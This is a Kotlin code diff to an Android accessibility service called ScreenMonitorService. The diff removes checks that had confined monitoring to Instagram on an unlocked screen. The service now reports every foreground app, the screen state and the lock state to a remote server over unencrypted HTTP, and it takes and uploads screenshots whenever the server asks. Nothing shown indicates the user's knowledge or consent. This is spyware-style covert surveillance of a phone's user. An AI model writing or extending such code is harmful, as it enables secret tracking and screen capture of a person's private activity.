@@ -73,27 +73,37 @@ class ScreenMonitorService : AccessibilityService() {
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
         val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
         
-        if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) return
-        if (!currentPackageName.contains("instagram")) return
+        val isScreenOn = powerManager.isInteractive
+        val isLocked = keyguardManager.isKeyguardLocked
 
         val serverIp = getSharedPrefsValue("server_ip")
         val deviceId = getSharedPrefsValue("device_id")
         
         if (serverIp == null || deviceId == null) return
 
-        // 1. Check if monitoring is enabled on server
         try {
             val statusUrl = URL("http://$serverIp:3001/api/status/$deviceId")
             val conn = statusUrl.openConnection() as HttpURLConnection
-            conn.requestMethod = "GET"
+            conn.requestMethod = "POST"
             conn.connectTimeout = 5000
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.doOutput = true
+            
+            val payload = JSONObject()
+            payload.put("current_app", currentPackageName)
+            payload.put("is_screen_on", isScreenOn)
+            payload.put("is_locked", isLocked)
+            
+            conn.outputStream.write(payload.toString().toByteArray())
+            conn.outputStream.flush()
+            conn.outputStream.close()
             
             if (conn.responseCode == 200) {
                 val response = conn.inputStream.bufferedReader().use { it.readText() }
                 val json = JSONObject(response)
-                val enabled = json.optBoolean("monitoring_enabled", false)
+                val takeScreenshot = json.optBoolean("take_screenshot", false)
                 
-                if (enabled) {
+                if (takeScreenshot) {
                     takeScreenshotAndUpload(serverIp, deviceId)
                 }
             }
